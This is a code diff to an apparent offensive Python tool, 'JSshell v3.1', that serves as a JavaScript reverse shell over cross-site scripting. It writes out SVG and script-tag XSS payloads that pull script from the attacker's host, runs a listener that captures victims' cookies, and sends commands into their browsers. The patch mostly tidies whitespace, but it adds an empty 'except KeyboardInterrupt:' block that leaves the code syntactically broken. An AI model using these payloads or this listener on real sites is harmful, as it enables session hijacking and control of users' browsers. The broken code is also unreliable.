@@ -4,16 +4,17 @@ import sys
 from requests import get
 import argparse
 
+
 red = '\033[1;31m'
 white = '\033[1;m'
 blue = '\033[1;34m'
 if sys.platform == 'win32':
     white = red = blue = ''
-    
+
 if sys.version_info < (3, 0):
     input = raw_input
 
-banner = '''%s    __              
+banner = '''%s    __
   |(_  _ |_  _  |  |
 \_|__)_> | |(/_ |  |
                       v3.1
@@ -57,7 +58,7 @@ else:
 
 gene = args.gene
 cmd = format(args.command)
-secs = int(format(args.secs))
+secs = float(format(args.secs))
 payload = '''
  - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}},1010)>
  - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}},1010)</script>
@@ -96,10 +97,10 @@ def shell():
                         pass
         except:
             pass
-            
+
         s.bind(('0.0.0.0', port))
         s.listen(0)
-        
+
         try:
             c, a = s.accept()
             data = c.recv(2048)
@@ -126,7 +127,7 @@ def shell():
                     print(cookie)
                 except:
                     print('Could not get the cookie because there is no cookie or because of other reasons')
-                              
+
             c.send(form + buffer.encode())
             c.shutdown(socket.SHUT_RDWR)
             c.close()
@@ -140,8 +141,6 @@ def shell():
             s.close()
             break
         
-
-        
 def main():
     global cookie
     global domain
@@ -154,22 +153,24 @@ def main():
     except socket.error as msg:
         print("Can't grab 0.0.0.0:%s with bind: %s" % (port, msg))
         quit()
-        
+
     uprint(banner)
     if gene == True:
         uprint('%sPayloads:  %s' % (white, payload))
-    
+
     print('%sListening on [any] %s for incoming JS shell ...' % (white, port))
-    
+
     s.listen(2)
-    
+
     try:
         c, addr = s.accept()
         resp = c.recv(1024).decode()
+    except KeyboardInterrupt:
+
     except:
         s.close()
         main()
-        
+
     if 'Accept' in resp and 'HTTP' in resp:
         print('Got JS shell from [%s] port %s to %s %s' % (addr[0], addr[1], socket.gethostname(), port))
         for line in resp.split('\n'):
@@ -184,12 +185,12 @@ def main():
         if len(cmd):
             c.send(form + cmd.encode())
             print('%s>>>%s %s' % (blue, white, cmd))
-            
+
         c.shutdown(socket.SHUT_RDWR)
         c.close()
         s.close()
         shell()
-        
+
     else:
         s.close()
         main()
